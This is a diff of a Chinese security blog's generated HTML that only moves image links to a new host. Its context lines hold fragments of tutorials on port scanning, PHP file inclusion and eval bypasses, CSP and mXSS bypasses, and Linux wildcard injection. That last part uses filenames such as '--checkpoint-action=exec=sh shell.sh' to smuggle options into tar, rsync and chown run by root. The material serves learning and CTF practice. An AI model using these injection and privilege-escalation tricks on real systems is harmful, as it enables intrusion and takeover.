-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190605170208.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190605170208.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>虽然因特网上最流行的服务运行在TCP协议上，但UDP服务被广泛部署。 DNS，SNMP和DHCP（注册端口53,161 / 162和67/68）是最常见的三种。 由于UDP扫描通常比TCP更慢且更困难，因此某些安全审核员会忽略这些端口。 这是一个错误，因为可利用的UDP服务非常普遍，攻击者肯定不会忽略整个协议。&lt;/p>
@@ -10599,20 +10599,20 @@ loading="lazy"
 >UDP Scan (-sU)&lt;/a>&lt;/p>
 &lt;h1 id="icmp">ICMP
 &lt;/h1>&lt;p>ICMP 格式：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190605170742.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190605170742.png"
 loading="lazy"
 >&lt;/p>
 &lt;blockquote>
 &lt;p>​ 根据网络协议，如果按照协议出现了错误，那么接收端将产生一个icmp的错误报文。这些错误报文并不是主动发送的，而是由于错误，根据协议自动产生。&lt;/p>
 &lt;/blockquote>
 &lt;p>ICMP 相关类型解释：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190605164952.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190605164952.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>一般如果数据包被防火墙过滤的话，会收到一个 ICMP 数据包，其中类型为3，代码为1，2，3，9，10或13。&lt;/p>
 &lt;h2 id="icmp-scan">ICMP SCAN
 &lt;/h2>&lt;p>常见的利用：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190605170934.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190605170934.png"
 loading="lazy"
 >&lt;/p>
 &lt;h1 id="sctp">SCTP
@@ -10626,7 +10626,7 @@ loading="lazy"
 &lt;/blockquote>
 &lt;p>简而言之，SCTP是TCP和UDP协议的一种相对较新的替代方案，它结合了TCP和UDP的大多数特性，还增加了多宿主和多流等新功能。它主要用于SS7 / SIGTRAN相关服务，但也有可能用于其他应用程序。&lt;/p>
 &lt;p>下图是 TCP 与 SCTP 建立连接的对比图：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190609005059.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190609005059.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="sctp-init-scan">SCTP INIT scan
@@ -10905,7 +10905,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>但是因为 PHP session 会话机制的关系，仅仅一次包含得到的&lt;code>sess_a&lt;/code>文件为空，所以我们需要竞争包含，使用 burp intruder 等形式都可以。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190606203219.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190606203219.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>大概30次可以成功7次左右，可以看到包含文件回显，但是看不到具体的文件内容，因为有部分 php 代码被解析了，所以我们可以使用&lt;code>tail -f&lt;/code>监测&lt;code>sess_a&lt;/code>的文件变化查看文件内容，可以看到内容如下：&lt;/p>
@@ -10920,12 +10920,12 @@ loading="lazy"
 &lt;/div>&lt;p>可以发现其中有 php 代码，所以当我们使用&lt;code>include&lt;/code>包含该文件的时候会执行该文件当中的 php 代码，让其执行。&lt;/p>
 &lt;h2 id="tmp">tmp
 &lt;/h2>&lt;p>条件：tmp 文件路径已知&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190606210821.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190606210821.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>php中上传文件，会创建临时文件。一般默认 php tmp 目录在 linux 下使用 /tmp 目录，而在 windows 下使用 c:\winsdows\temp 目录。在临时文件被删除之前，利用竞争即可包含该临时文件。&lt;/p>
 &lt;p>如果存在&lt;code>phpinfo()&lt;/code>界面即可配合&lt;code>phpinfo()&lt;/code>界面的回显来利用，例如向&lt;code>phpinfo()&lt;/code>界面上传一个文件，可以得到文件名的回显，再利用一些方法阻塞服务器的操作就可以进行包含了&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190606213614.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190606213614.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>具体流程如下：&lt;/p>
@@ -11028,7 +11028,7 @@ loading="lazy"
 &lt;/h3>&lt;p>整个代码逻辑非常简单，接受一个&lt;code>$_GET['str']&lt;/code>的传参，在经过&lt;code>addslashes()&lt;/code>函数转义特殊符号与正则表达式检验之后，传入&lt;code>eval()&lt;/code>当中拼接到&lt;code>$a=&amp;quot;&amp;quot;;&lt;/code>变量当中。&lt;/p>
 &lt;p>既然有&lt;code>eval()&lt;/code>，那是不是可以执行命令呢？答案是当然可以的。&lt;/p>
 &lt;p>首先我们来看正则表达式的效果如下图所示&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006336.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006336.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>如果小括号前有数字或者字母的话就会&lt;code>die()&lt;/code>掉整个程序，大概意思就是防止直接使用函数，例如不能直接使用&lt;code>system('ls')&lt;/code>这样子。&lt;/p>
@@ -11088,7 +11088,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005936.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005936.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="thinking">Thinking
@@ -11100,15 +11100,15 @@ loading="lazy"
 &lt;p>{% endcolorquote %}&lt;/p>
 &lt;p>我们可以看到&lt;code>${phpinfo()}&lt;/code>里面在严格意义上来说并不是一个变量，那为什么可以执行呢？&lt;/p>
 &lt;p>让我们来看一个例子&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007200.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007200.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007816.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007816.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>在 php 中，可以接受函数的返回值作为变量名，而&lt;code>phpinfo()&lt;/code>的返回值为&lt;code>TRUE&lt;/code>，所以先将&lt;code>phpinfo()&lt;/code>执行了，将返回值返回作为了变量名。&lt;/p>
 &lt;p>我们可以再来看一个例子。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000457.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000457.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里就更清楚的说明了执行了&lt;code>system('whomai')&lt;/code>并把其返回值&lt;code>zedd&lt;/code>作为了变量，最后&lt;code>$zedd&lt;/code>才被修改了。&lt;/p>
@@ -11158,7 +11158,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>那加上&lt;code>addslashes()&lt;/code>方法呢？既然不能逃逸双引号，我们就可以利用 php 复杂变量来处理。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002715.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002715.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="difficult">Difficult
@@ -11188,23 +11188,23 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>好的，终于回到了我们题目，这样的话就不能单纯地使用函数方法了。那我们可以怎么做呢？&lt;/p>
 &lt;p>如果开启了&lt;code>Notice&lt;/code>回显的话，我们可以利用反引号就可以简单实现命令执行了&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002827.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002827.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>那要是没开启呢？自然不可行了。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007385.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007385.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>接下来就可以利用可变函数的与字符串拼接的特性了，简单来说就用下图的技巧，详细的可以移步个人博客查看&lt;a class="link" href="https://zeddyu.github.io/2019/02/28/Some-Tricks-of-Bypass-php-waf/" target="_blank" rel="noopener"
 >Some Tricks of Bypass php waf&lt;/a>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008760.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008760.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003443.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003443.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>所以我们可以这里玩法就很多样了&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009115.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009115.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>关于 php 复杂变量的玩法还有很多，这里就大概说到这里吧，文中有不对之处还望师傅们斧正。&lt;/p>
@@ -11657,7 +11657,7 @@ In computer security, a vulnerability is a weakness which can be exploited by a 
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这样只要一次访问成功该 php 文件，即可拿到 shell&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008080.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008080.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="pass-18">Pass-18
@@ -11897,7 +11897,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这里需要注意的是，&lt;code>save_name[0]&lt;/code>放&lt;code>jpg&lt;/code>就好了，否则&lt;code>$ext&lt;/code>拿到的是&lt;code>upload-20.jpg&lt;/code>，这样整个字符串就会进入&lt;code>!in_array($ext, $allow_suffix)&lt;/code>这个判断里面了。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006384.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006384.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="conclusion">Conclusion
@@ -12532,11 +12532,11 @@ loading="lazy"
 &lt;/div>&lt;p>CSP 目前有两版, [CSP1][] 和 [CSP2][]. 两版的支持状态可以在 &lt;a class="link" href="http://caniuse.com/#search=csp" target="_blank" rel="noopener"
 >http://caniuse.com/#search=csp&lt;/a> 中查到. 如下:&lt;/p>
 &lt;p>CSP 1.0:&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007189.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007189.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>CSP 2.0:&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001204.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610001204.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="x-frame-options">X-Frame-Options
@@ -13124,7 +13124,7 @@ alt="http"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>当前目录下随便放置一个文件提供引入即可，然后我们可以发现&lt;code>iframe&lt;/code>当中其实就是个 html 页面&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009928.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009928.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>然后我们尝试对其进行修改&lt;/p>
@@ -13136,11 +13136,11 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">window&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">frames&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">head&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">innerHTML&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;hasaki!&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003468.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003468.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们就可以在&lt;code>iframe&lt;/code>的页面中发现&lt;code>&amp;lt;head&amp;gt;&lt;/code>标签内容已经被我们改成了&lt;code>hasaki!&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000023.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000023.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>做到这里，我们基本可以想到，如果我们引用的是一个没有 CSP 策略的地址含有恶意的 js 代码会怎么样呢？我们可以试一下&lt;/p>
@@ -13206,7 +13206,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>可以发现执行了 javascript 代码&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004313.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004313.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="example-2">Example 2
@@ -13590,7 +13590,7 @@ Jsonp 正是利用这种特性来实现跨域的：在页面中引入要跨域�
 &lt;h3 id="mxss-attacks">MXSS Attacks
 &lt;/h3>&lt;h4 id="介绍-3">介绍
 &lt;/h4>&lt;p>不论是服务器端或客户端的XSS过滤器，都认定过滤后的HTML源代码应该与浏览器所渲染后的HTML代码保持一致，至少不会出现很大的出入。然而，如果用户所提供的富文本内容通过 javascript 代码进属性后，一些意外的变化会使得这个认定不再成立：一串看似没有任何危害的HTML代码，将逃过XSS过滤器的检测，最终进入某个DOM节点中，浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进后发生意外变化（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation），而最终导致XSS的攻击流程，被称为突变XSS（mXSS, Mutation-based Cross-Site-Scripting）。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000864.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000864.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="常见注入点-2">常见注入点
@@ -14163,7 +14163,7 @@ be decoded either&lt;/p>
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;take help&amp;#34;&lt;/span> &amp;gt; --help
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004647.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004647.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>首先创建几个文件，其中有一个是&lt;code>--help&lt;/code>，然后使用&lt;code>cat&lt;/code>命令读取文件内容&lt;/p>
@@ -14179,31 +14179,31 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat --help
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007192.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007192.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>如果按照我们预期的，是不是在第三个&lt;code>cat --help&lt;/code>处应该是要读取&lt;code>—help&lt;/code>文件的内容呢？然而我们执行&lt;code>cat —help&lt;/code>却优先执行了&lt;code>cat&lt;/code>命令的帮助选项，并没有读出&lt;code>—help&lt;/code>里的内容。&lt;/p>
 &lt;p>不仅是&lt;code>cat&lt;/code>，&lt;code>ls&lt;/code>等命令也会优先调用内置&lt;code>--help&lt;/code>选项。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009843.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009843.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>以及还有&lt;code>--all&lt;/code>选项。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007699.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007699.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>其实讲道理，词法分析把对诸如&lt;code>--help&lt;/code>、&lt;code>--all&lt;/code>等选项优先处理为内置选项输出，看起来并没有任何问题&lt;/p>
 &lt;p>这个技巧叫做&lt;code>Wildcard wildness&lt;/code>，中文有人译为通配符在野。(&lt;code>-all&lt;/code>、&lt;code>--help&lt;/code>可以通过加入&lt;code>./&lt;/code>成&lt;code>./-all&lt;/code>、&lt;code>./--help&lt;/code>来特指这个文件，避免这个问题)&lt;/p>
 &lt;h4 id="example-2">Example 2
-&lt;/h4>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008865.jpg"
+&lt;/h4>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008865.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>如图，我们有两个文件，当用&lt;code>rm *&lt;/code>的时候，只删掉了&lt;code>file1&lt;/code>与&lt;code>file2&lt;/code>，并没有删除&lt;code>*&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001503.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610001503.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>或者使用&lt;code>rm file1 file2 -rf&lt;/code>逐个删除之时，也只删掉了&lt;code>file1&lt;/code>与&lt;code>file2&lt;/code>&lt;/p>
 &lt;p>使用&lt;code>strace rm *&lt;/code>我们可以发现&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005779.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005779.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>由于当前目录中存在&lt;code>-rf&lt;/code>文件名，&lt;code>rm&lt;/code>将&lt;code>-rf&lt;/code>选项作为最后一个参数，并且递归删除当前目录中的所有文件。同样，若要删除可以加上&lt;code>./-rf&lt;/code>进行删除&lt;/p>
@@ -14212,16 +14212,16 @@ loading="lazy"
 &lt;h4 id="file-owner-hijacking">File Owner Hijacking
 &lt;/h4>&lt;p>现在我们有三个用户，一个&lt;code>zedd&lt;/code>，一个&lt;code>test&lt;/code>，一个&lt;code>root&lt;/code>用户。&lt;/p>
 &lt;p>我们分别用&lt;code>zedd&lt;/code>与&lt;code>test&lt;/code>创建了不同的文件，&lt;code>1.php&lt;/code>与&lt;code>test.php&lt;/code>都属于&lt;code>test&lt;/code>用户的文件，&lt;code>zedd.php&lt;/code>与&lt;code>--reference=zedd.php&lt;/code>均属于&lt;code>zedd&lt;/code>用户的文件。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005137.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005137.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>然后使用&lt;code>root&lt;/code>用户使用&lt;code>chown -R test:test *.php&lt;/code>命令，想把本目录下所有的&lt;code>.php&lt;/code>文件修改为&lt;code>test&lt;/code>用户所有。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008433.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008433.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>但是结果我们可以发现，结果该目录下所有的&lt;code>.php&lt;/code>文件都被修改为了&lt;code>zedd&lt;/code>用户所有，成功“提权”。&lt;/p>
 &lt;p>原理我们可以用&lt;code>strace chown -R zedd:zedd *.php&lt;/code>来看一下（注意这里换了一下，模拟想把&lt;code>.php&lt;/code>文件改变成&lt;code>zedd&lt;/code>用户所有）&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009617.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009617.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们可以看到&lt;/p>
@@ -14246,7 +14246,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>&lt;code>--reference=RFILE&lt;/code>这个选项则是使用&lt;code>RFILE&lt;/code>的文件拥有者和用户组来改变文件属性，而不是使用传入的&lt;code>OWNER:GROUP&lt;/code>参数。&lt;/p>
 &lt;p>因此，在这种情况下，&lt;code>chown&lt;/code>的&lt;code>--reference&lt;/code>选项将覆盖指定为&lt;code>root&lt;/code>用户输入的参数&lt;code>zedd:zedd&lt;/code>，把此目录中所有&lt;code>.php&lt;/code>文件的所有者改变与&lt;code>.backdoor.php&lt;/code>的所有者&lt;code>test&lt;/code>。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003986.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003986.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>所以，按照这种方法，我们可以劫持&lt;code>root&lt;/code>将文件的所有权更改为任意用户，并“劫持”我们想要的文件。&lt;/p>
@@ -14260,7 +14260,7 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">--reference&lt;span class="o">=&lt;/span>RFILE use RFILE&lt;span class="err">&amp;#39;&lt;/span>s mode instead of MODE values
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000066.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000066.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>与&lt;code>chown&lt;/code>类似，因为有&lt;code>--reference=.backdoor.php&lt;/code>的存在，在使用&lt;code>chmod 000 *&lt;/code>的时候也会把劫持到与&lt;code>.backdoor.php&lt;/code>文件权限一样的权限&lt;/p>
@@ -14282,15 +14282,15 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>从帮助文档，我们大致可以从中理解到，&lt;code>--checkpoint=1&lt;/code>可以用来显示信息，&lt;code>--checkpoint-action=exec=sh shell.sh&lt;/code>可以用来执行命令&lt;/p>
 &lt;p>先尝试构建一个&lt;code>shell.sh&lt;/code>脚本，内容为&lt;code>/usr/bin/id&lt;/code>，以及文件名为&lt;code>--checkpoint=1&lt;/code>与&lt;code>--checkpoint-action=exec=sh shell.sh&lt;/code>的文件，使用&lt;code>tar -cf test.tar *&lt;/code>把当前目录下所有文件压缩到&lt;code>test.tar&lt;/code>压缩包内&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008945.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008945.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>可见，&lt;code>/usr/bin/id&lt;/code>已经被成功执行输出。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007928.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007928.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>与之前一样，&lt;code>--checkpoint=1&lt;/code>与&lt;code>--checkpoint-action=exec=sh shell.sh&lt;/code>被作为选项处理&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007550.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007550.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>在 2018 SWPUCTF 上有一道 web 题考点也正是利用了这个点，由于题目官方没有开源，这里给一个比较详细的 @一叶飘零 师傅写的 wp 用于参考学习: &lt;a class="link" href="https://skysec.top/2018/12/17/2018SWPUCTF-Web/#%E4%BF%A1%E6%81%AF%E5%86%8D%E6%AC%A1%E5%8F%91%E6%8E%98" target="_blank" rel="noopener"
@@ -14317,7 +14317,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>&lt;code>--rsh=COMMAND&lt;/code>又是一个我们可以利用的地方，我们首先创建一个文件名为&lt;code>-e sh shell.c&lt;/code>的文件，然后再创建一个&lt;code>shell.c&lt;/code>文件，污染&lt;code>rsync&lt;/code>参数来实现执行我们在&lt;code>shell.c&lt;/code>中写入的预期命令&lt;/p>
 &lt;p>假设当前目录下我们拥有一个只有&lt;code>root&lt;/code>用户可读的&lt;code>rootfile&lt;/code>文件，由于不能直接输出结果，我们可以构造&lt;code>cat ./rootfile &amp;gt; ./output&lt;/code>，将文件内容读出。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004148.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004148.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>得到的&lt;code>output&lt;/code>文件是 644 的权限，这样我们就成功构造了一个提权读取的文件的 payload ，这里可能需要注意的是，只能提取到执行&lt;code>rsync&lt;/code>用户的权限，不是直接的&lt;code>root&lt;/code>权限，这里因为执行命令的是&lt;code>root&lt;/code>权限，所以能读取只有&lt;code>root&lt;/code>用户才能读取的&lt;code>rootfile&lt;/code>文件&lt;/p>
@@ -14331,7 +14331,7 @@ loading="lazy"
 &lt;/li>
 &lt;li>
 &lt;p>&lt;code>tar&lt;/code>命令需要进入到&lt;code>--checkpoint=1&lt;/code>文件所在的目录内，如果加上绝对路径将会失效，例如&lt;code>tar cf test.tar /var/www/html/*&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005324.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005324.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们可以看到 shell 处理方式将&lt;code>/home/zedd/Desktop/test&lt;/code>与目录下的文件名逐个拼接起来，就达不到污染参数的效果了&lt;/p>
@@ -14341,7 +14341,7 @@ loading="lazy"
 &lt;/li>
 &lt;li>
 &lt;p>利用&lt;code>chmod u+s /usr/bin/find&lt;/code>提升为&lt;code>root&lt;/code>权限执行，配合&lt;code>find&lt;/code>命令的&lt;code>-exec COMMAND&lt;/code>来执行命令，例如&lt;code>find f1 -exec &amp;quot;whoami&amp;quot; \;&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009998.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009998.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;/li>
@@ -14351,7 +14351,7 @@ loading="lazy"
